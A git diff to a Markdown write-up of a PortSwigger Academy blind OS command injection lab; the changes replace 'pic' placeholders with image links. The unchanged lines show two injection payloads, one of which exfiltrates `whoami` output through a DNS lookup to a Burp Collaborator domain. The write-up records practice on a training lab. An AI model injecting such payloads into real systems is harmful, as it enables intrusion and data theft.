@@ -13,7 +13,8 @@ Note: Because the Academy's firewall prevents the lab from contacting arbitrary 
 **Reference:**
 - https://portswigger.net/web-security/os-command-injection
 
-pic 1
+<img width="765" height="285" alt="1" src="https://github.com/user-attachments/assets/5793e8a9-5401-4154-b74d-e2df4312b94c" />
+
 
 ---
 
@@ -23,7 +24,8 @@ The feedback form accepts out-of-band interaction through this payload:
 $(nslookup juh2fcq2cctj3nb1g8ecp69m6dc400op.oastify.com)
 ```
 
-pic 2
+<img width="715" height="633" alt="2" src="https://github.com/user-attachments/assets/ced87796-3078-408c-8a23-fdeab8765e1f" />
+
 
 Using the following payload, the username `peter-0B6BNY` was successfully extracted:
 
@@ -31,6 +33,8 @@ Using the following payload, the username `peter-0B6BNY` was successfully extrac
 $(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
 ```
 
-pic 3
+<img width="711" height="629" alt="3" src="https://github.com/user-attachments/assets/e886c7ee-00a3-4e6c-8a84-6b093e78b555" />
 
-pic 4
+
+<img width="899" height="236" alt="4" src="https://github.com/user-attachments/assets/c6f154eb-e0ee-49e0-a8d6-2f6806d87b02" />
+
